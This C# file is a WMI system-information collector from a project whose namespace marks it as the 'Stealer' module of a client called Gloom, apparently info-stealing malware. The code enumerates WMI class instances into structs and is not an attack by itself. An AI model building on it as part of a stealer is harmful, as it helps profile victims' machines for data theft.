using System.Management;
using System.Reflection;

namespace Gloom.Client.Features.Stealer.InfoCollector.Wmi;
internal abstract class WmiInfo
{
	internal Guid WmiOp { get; }
	protected WmiInfo(Guid wmiOp) => WmiOp = wmiOp;

	public abstract object Collect();

	protected static T[] Crawl<T>(string wmiClass) where T : struct
	{
		if (Environment.OSVersion.Platform != PlatformID.Win32NT)
			return Array.Empty<T>();

		var cls = new ManagementClass(wmiClass);
		var list = new List<T>();
		foreach (ManagementBaseObject obj in cls.GetInstances())
		{
			object instance = new T();
			foreach (PropertyInfo prop in instance.GetType().GetProperties())
			{
				try
				{
					var data = obj[prop.Name];
					if (prop.PropertyType == typeof(DateTime) && data is string sdata)
						data = ManagementDateTimeConverter.ToDateTime(sdata);
					prop.SetValue(instance, data);
				}
				catch (Exception ex)
				{
					Console.WriteLine("Exception while processing property: " + prop.Name + " -> " + ex);
				}
			}
			list.Add((T)instance);
		}
		return list.ToArray();
	}
}
